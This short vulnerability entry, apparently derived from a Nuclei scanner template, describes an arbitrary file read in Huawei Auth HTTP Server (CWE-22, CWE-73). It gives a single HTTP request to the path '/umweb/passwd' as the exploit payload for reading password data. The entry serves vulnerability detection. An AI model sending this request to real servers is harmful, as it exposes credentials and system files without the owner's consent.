# Vulnerability: Huawei Auth Http Server - Arbitrary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`huawei-authhttp-lfi.yaml`)

## Description
Huawei Auth HTTP Server is vulnerable to Arbitrary File Read.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/umweb/passwd
```

